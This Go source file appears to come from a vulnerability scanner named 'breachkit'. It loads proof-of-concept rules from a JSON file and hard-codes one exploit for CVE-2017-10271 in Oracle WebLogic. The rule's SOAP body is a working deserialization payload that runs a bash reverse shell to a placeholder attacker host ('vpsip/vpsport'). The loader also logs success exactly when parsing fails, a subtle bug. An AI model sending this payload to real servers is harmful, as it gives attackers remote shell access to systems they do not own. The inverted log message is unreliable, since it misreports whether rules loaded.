package config

import (
	"encoding/json"
	"github.com/binganao/breachkit/pkg/logger"
	"io/ioutil"
	"os"
)

type Instr struct {
	BodyStr   []string
	HeaderStr map[string]string
}

type PocRule struct {
	Rank      string
	Name      string
	Method    string
	Path      string
	Header    map[string]string
	Body      string
	Logic     string
	StrVerity Instr
}

func GetRule() {
	var pocs []PocRule
	_, err := os.Stat("./pocs/all.json")
	if err != nil {
		return
	}

	f, err := os.OpenFile("./pocs/all.json", os.O_RDONLY, 0666)
	if err != nil {
		return
	}

	fb, err := ioutil.ReadAll(f)
	if err != nil {
		return
	}

	e := json.Unmarshal(fb, &pocs)
	if e != nil {
		logger.Info("Get pocs success!")
	}

	for _, poc := range pocs {
		PocRules = append(PocRules, poc)
	}

}

var PocRules = []PocRule{
	{"1", "CVE-2017-10271", "POST", "/wls-wsat/CoordinatorPortType", map[string]string{"Content-Type": "text/xml;charset=UTF-8", "User-Agent": "TestUA/1.0"}, "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:wsa=\"http://www.w3.org/2005/08/addressing\" xmlns:asy=\"http://www.bea.com/async/AsyncResponseService\">   \n<soapenv:Header> \n<wsa:Action>xx</wsa:Action>\n<wsa:RelatesTo>xx</wsa:RelatesTo>\n<work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">\n<void class=\"java.lang.ProcessBuilder\">\n<array class=\"java.lang.String\" length=\"3\">\n<void index=\"0\">\n<string>/bin/bash</string>\n</void>\n<void index=\"1\">\n<string>-c</string>\n</void>\n<void index=\"2\">\n<string>bash -i &gt;&amp; /dev/tcp/vpsip/vpsport 0&gt;&amp;1</string>\n</void>\n</array>\n<void method=\"start\"/></void>\n</work:WorkContext>\n</soapenv:Header>\n<soapenv:Body>\n<asy:onAsyncDelivery/>\n</soapenv:Body></soapenv:Envelope>", "bodyor", Instr{BodyStr: []string{"<faultstring>java.lang.ProcessBuilder", "<faultstring>0"}, HeaderStr: nil}},
}
